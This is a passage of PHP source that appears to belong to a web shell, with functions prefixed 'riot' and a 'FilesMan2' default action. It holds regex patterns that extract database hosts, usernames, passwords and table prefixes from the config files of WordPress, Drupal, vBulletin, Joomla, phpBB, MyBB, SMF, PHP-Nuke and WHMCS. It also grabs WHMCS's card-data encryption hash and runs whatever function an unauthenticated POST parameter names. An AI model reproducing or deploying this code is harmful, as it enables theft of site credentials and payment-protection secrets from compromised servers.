            "dbname" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "dbuser" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "dbpw" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "prefix" => ["/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 1],
        ],
        "drupal" => [
            "file" => "/config.php",
            "host" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "dbname" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "dbuser" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "dbpw" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
            "prefix" => ["/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/", 1],
        ],
        "drupal2" => [
            "file" => "/sites/default/settings.php",
            "host" => ["/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/", 1],
            "dbname" => ["/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/", 1],
            "dbuser" => ["/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/", 1],
            "dbpw" => ["/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/", 1],
            "prefix" => ["/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/", 1],
        ],
        "vb" => [
            "file" => "/includes/config.php",
            "host" => ["/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 3],
            "dbuser" => ["/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 3],
            "dbname" => ["/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 3],
            "dbpw" => ["/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 3],
            "prefix" => ["/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/", 3],
        ],
        "phpnuke" => [
            "file" => "/config.php",
            "host" => ['/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/', 3],
            "dbname" => ['/dbname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/', 3],
            "dbuser" => ['/dbuname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/', 3],
            "dbpw" => ['/dbpass(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/', 3],
            "prefix" => ['/prefix(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/', 3],
        ],
        "smf" => [
            "file" => "/Settings.php",
            "host" => ["/db_server(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbname" => ["/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbuser" => ["/db_user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbpw" => ["/db_passwd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "prefix" => ["/db_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
        ],
        "whmcs" => [
            "file" => "/configuration.php",
            "host" => ["/db_host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbname" => ["/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbuser" => ["/db_username(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbpw" => ["/db_password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "cc_encryption_hash" => ["/cc_encryption_hash(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
        ],
        "joomla" => [
            "file" => "/configuration.php",
            "host" => ["/\\\$host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbname" => ["/\\\$db(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbuser" => ["/\\\$user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbpw" => ["/\\\$password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "prefix" => ["/\\\$dbprefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
        ],
        "phpbb" => [
            "file" => "/config.php",
            "host" => ["/dbhost(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbname" => ["/dbname(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbuser" => ["/dbuser(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbpw" => ["/dbpasswd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "prefix" => ["/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
        ],
        "mybb" => [
            "file" => "/inc/config.php",
            "host" => ["/config\['database'\]\['hostname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbname" => ["/config\['database'\]\['database'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbuser" => ["/config\['database'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "dbpw" => ["/config\['database'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
            "prefix" => ["/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/", 3],
        ],
    ];
    if ($cms == "drupal") {
        $file = $config[$cms]["file"];
        $file = $path . $file;
        if (@is_file($file) || _riot_is_dir($file, "-e")) {
        } else {
            $cms = "drupal2";
        }
    }
    if ($cms == "vb") {
        $file = $config[$cms]["file"];
        $file = $path . $file;
        if (@is_file($file) || _riot_is_dir($file, "-e")) {
        } else {
            $path .= "/core";
        }
    }
    $data = [];
    $srch_host = $config[$cms]["host"][0];
    $srch_user = $config[$cms]["dbuser"][0];
    $srch_name = $config[$cms]["dbname"][0];
    $srch_pw = $config[$cms]["dbpw"][0];
    $prefix = $config[$cms]["prefix"][0];
    $file = $config[$cms]["file"];
    $chost = $config[$cms]["host"][1];
    $cuser = $config[$cms]["dbuser"][1];
    $cname = $config[$cms]["dbname"][1];
    $cpw = $config[$cms]["dbpw"][1];
    $cprefix = $config[$cms]["prefix"][1];
    if (@is_dir($path) || _riot_is_dir($path)) {
        $file = $path . $file;
    } elseif (@is_file($path) || _riot_is_dir($path, "-e")) {
        $file = $path;
    } else {
        return false;
    }
    $file = __read_file($file);
    if ($cms == "drupal2") {
        $file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
    } elseif ($cms == "vb") {
        $file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
    }
    if (preg_match($srch_host, $file, $mach)) {
        $data["host"] = $mach[$chost];
    }
    if (preg_match($srch_user, $file, $mach)) {
        $data["user"] = $mach[$cuser];
    }
    if (preg_match($srch_name, $file, $mach)) {
        $data["dbname"] = $mach[$cname];
    }
    if (preg_match($srch_pw, $file, $mach)) {
        $data["password"] = $mach[$cpw];
    }
    if (isset($prefix)) {
        if (preg_match($prefix, $file, $mach)) {
            $data["prefix"] = $mach[$cprefix];
        }
    }
    if ($cms == "whmcs") {
        if (preg_match($config[$cms]["cc_encryption_hash"][0], $file, $mach)) {
            $data["cc_encryption_hash"] = $mach[3];
        }
    }
    echo json_encode($data);
}
if (empty($_POST["a"])) {
    if (isset($default_action) && function_exists("riot" . $default_action)) {
        $_POST["a"] = $default_action;
    } else {
        $_POST["a"] = "FilesMan2";
    }
}
if (!empty($_POST["a"]) && function_exists("riot" . $_POST["a"])) {
    call_user_func("riot" . $_POST["a"]);
}
exit();

?>